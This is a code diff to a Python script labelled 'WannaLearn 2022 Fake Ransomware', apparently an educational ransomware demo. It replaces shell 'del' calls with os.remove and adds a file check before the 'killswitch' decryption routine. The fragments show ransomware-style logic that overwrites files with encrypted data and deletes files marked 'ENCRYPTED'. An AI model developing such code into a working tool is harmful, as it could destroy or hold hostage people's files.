@@ -62,8 +62,8 @@ def clear_cryps(path=rootdir):
         else:
             if "ENCRYPTED" in new_path:
                 new_path = os.path.normpath(new_path)
-                cmd = f'del "{new_path}"'                
-                os.system(cmd)
+                cmd = f'{new_path}'                
+                os.remove(cmd)
 
 def hex_to_dir():
 
@@ -138,7 +138,7 @@ def encrypt():
             with open(new_path, "wb") as cryp:
                 cryp.write(data)
     try:
-        os.system("del dump")
+        os.remove("dump")
     except:
         pass
     with open('dump', 'w') as f:
@@ -151,11 +151,16 @@ def encrypt():
     input("Press any key to exit.")
 
 def decrypt():
+    try:
+        f = open('dump')
+        f.close()
+    except FileNotFoundError:
+        exit()
     print("You found the killswitch!")
     print()
     print("OK, decrypting your files.")    
     hex_to_dir()
-    print("Thanks for using WannaLearn 2022 Fake Ransomware :)")
+    input("Thanks for using WannaLearn 2022 Fake Ransomware :)")
     print()
     input("Press any key to exit.")    
     
